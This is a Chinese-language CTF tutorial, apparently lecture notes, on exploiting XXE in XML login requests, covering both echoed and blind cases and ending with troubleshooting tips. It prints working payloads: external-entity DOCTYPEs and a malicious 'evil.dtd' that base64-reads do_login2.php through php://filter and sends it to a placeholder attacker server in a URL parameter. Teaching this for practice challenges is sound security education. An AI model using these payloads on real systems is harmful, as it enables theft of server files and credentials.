## 有回显XXE漏洞利用

![](img/73182f525fa64731fbe509ad9ff43416_12.png)

![](img/73182f525fa64731fbe509ad9ff43416_14.png)

上一节我们介绍了XXE漏洞的基本原理，本节中我们来看看如何在实际题目中利用有回显的XXE漏洞。

![](img/73182f525fa64731fbe509ad9ff43416_18.png)

![](img/73182f525fa64731fbe509ad9ff43416_20.png)

![](img/73182f525fa64731fbe509ad9ff43416_22.png)

![](img/73182f525fa64731fbe509ad9ff43416_23.png)

首先，我们需要对目标进行测试，确认漏洞存在。通过抓取登录请求的数据包，我们发现请求体是XML格式，并且服务器会将处理结果中的部分信息（如`message`字段）回显给用户。

![](img/73182f525fa64731fbe509ad9ff43416_25.png)

![](img/73182f525fa64731fbe509ad9ff43416_27.png)

![](img/73182f525fa64731fbe509ad9ff43416_29.png)

以下是测试漏洞存在的关键步骤：
1.  尝试在`username`字段中插入一个引用外部实体的Payload。
2.  如果服务器向我们的外部服务器发起了请求，则证明存在XXE漏洞。

![](img/73182f525fa64731fbe509ad9ff43416_31.png)

![](img/73182f525fa64731fbe509ad9ff43416_33.png)

![](img/73182f525fa64731fbe509ad9ff43416_34.png)

确认漏洞存在后，下一步是读取目标服务器上的关键文件。我们的目标是获取处理登录逻辑的文件（`do_login.php`）的内容，从而找到正确的用户名和密码。

解题的核心思路是利用XXE读取本地文件。以下是具体的Payload结构：
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY remote SYSTEM "http://攻击者服务器/接收数据">
]>
<user>
<username>&remote;</username>
<password>任意值</password>
</user>
```
我们需要将`http://攻击者服务器/接收数据`替换为一个能读取文件并返回内容的地址。通常，我们可以使用`php://filter`包装器来读取文件并进行Base64编码，防止特殊字符破坏XML结构。

最终，服务器会将读取到的文件内容（经过Base64编码）回显在`message`字段中。我们对其进行解码，即可获得文件中的用户名和密码，从而成功登录。

## 无回显XXE漏洞利用

![](img/73182f525fa64731fbe509ad9ff43416_44.png)

![](img/73182f525fa64731fbe509ad9ff43416_46.png)

![](img/73182f525fa64731fbe509ad9ff43416_47.png)

![](img/73182f525fa64731fbe509ad9ff43416_48.png)

解决了有回显的题目后，我们面临一个新的挑战：当服务器不返回任何有效数据时，如何利用XXE漏洞？这就是无回显XXE的场景。

在第二道题中，我们发现服务器只返回一个表示登录成功与否的`code`（0或1），而不会回显我们输入的内容。因此，我们无法像上一题那样直接获取文件内容。

![](img/73182f525fa64731fbe509ad9ff43416_50.png)

在这种情况下，我们需要采用“带外数据”技术。基本思路是：让服务器将读取到的文件内容，通过HTTP请求发送到我们控制的另一台服务器上，我们从这台服务器的访问日志中提取数据。

以下是实现无回显XXE利用的关键步骤：

![](img/73182f525fa64731fbe509ad9ff43416_52.png)

![](img/73182f525fa64731fbe509ad9ff43416_53.png)

![](img/73182f525fa64731fbe509ad9ff43416_55.png)

![](img/73182f525fa64731fbe509ad9ff43416_57.png)

首先，我们需要在攻击者控制的服务器上放置一个DTD文件。该文件定义了如何读取目标文件并将数据带出。
```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=do_login2.php">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://攻击者服务器/?data=%file;'>">
```
这个DTD文件做了三件事：
1.  定义参数实体 `%file`，用于读取并Base64编码`do_login2.php`文件。
2.  定义参数实体 `%int`，其内部又定义了一个参数实体 `%send`。`%send`会构造一个向攻击者服务器发起的HTTP请求，并将`%file`的内容作为URL参数`data`的值。
3.  最后引用`%int`和`%send`来触发整个流程。

接着，我们在攻击的XML Payload中引用这个外部的DTD文件。
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
<!ENTITY % dtd SYSTEM "http://攻击者服务器/evil.dtd">
%dtd;
%int;
%send;
]>
<user>
<username>test</username>
<password>test</password>
</user>
```
当这个Payload被目标服务器解析时：
1.  它会加载外部DTD（`evil.dtd`）。
2.  执行DTD中定义的实体，读取`do_login2.php`文件并进行编码。
3.  向攻击者服务器的指定URL发起一个GET请求，编码后的文件内容就包含在URL的`data`参数中。

![](img/73182f525fa64731fbe509ad9ff43416_59.png)

最后，我们只需查看攻击者服务器的Web访问日志，就能找到包含文件数据的请求记录，对其进行Base64解码即可获得文件内容。

![](img/73182f525fa64731fbe509ad9ff43416_63.png)

## 常见问题与错误排查

![](img/73182f525fa64731fbe509ad9ff43416_65.png)

![](img/73182f525fa64731fbe509ad9ff43416_67.png)

在解题过程中，同学们遇到了一些问题。以下是几个常见错误及解决方法：

![](img/73182f525fa64731fbe509ad9ff43416_68.png)

![](img/73182f525fa64731fbe509ad9ff43416_70.png)

![](img/73182f525fa64731fbe509ad9ff43416_72.png)

**问题一：Payload中的地址错误**
在无回显利用中，DTD文件的地址和`send`实体中请求的地址，都必须是目标服务器能够访问到的公网地址（即攻击者服务器的地址）。使用`localhost`或`127.0.0.1`会导致目标服务器向自己发起请求，从而失败。

![](img/73182f525fa64731fbe509ad9ff43416_74.png)

**问题二：文件路径错误**
在DTD文件中读取目标文件时，应使用目标服务器上的绝对路径或相对路径。例如，如果文件在Web根目录下，直接使用文件名`do_login2.php`即可。不需要也不能使用`http://`开头的URL。

**问题三：DTD文件语法错误**
确保DTD文件的语法正确，特别是参数实体的定义和引用格式。注意`%`、`;`等符号的使用。一个格式错误可能导致整个Payload失效。

**问题四：特殊字符处理**
如果读取的文件内容包含XML特殊字符（如`<`, `&`, `"`等），直接输出会破坏XML结构。因此，务必使用`php://filter`的`convert.base64-encode`过滤器对文件内容进行编码。

## 总结

本节课中我们一起学习了如何利用有回显和无回显两种场景下的XXE漏洞。
*   对于**有回显XXE**，核心是直接构造读取文件的Payload，并从服务器的响应中获取数据。
*   对于**无回显XXE**，核心是使用带外数据技术，通过让服务器向攻击者控制的地址发起请求，从而在访问日志中泄露数据。

![](img/73182f525fa64731fbe509ad9ff43416_76.png)

理解这两种利用方式的区别与联系，对于掌握XXE漏洞至关重要。希望大家通过这两道练习题，能够熟练掌握XXE漏洞的发现与利用方法。
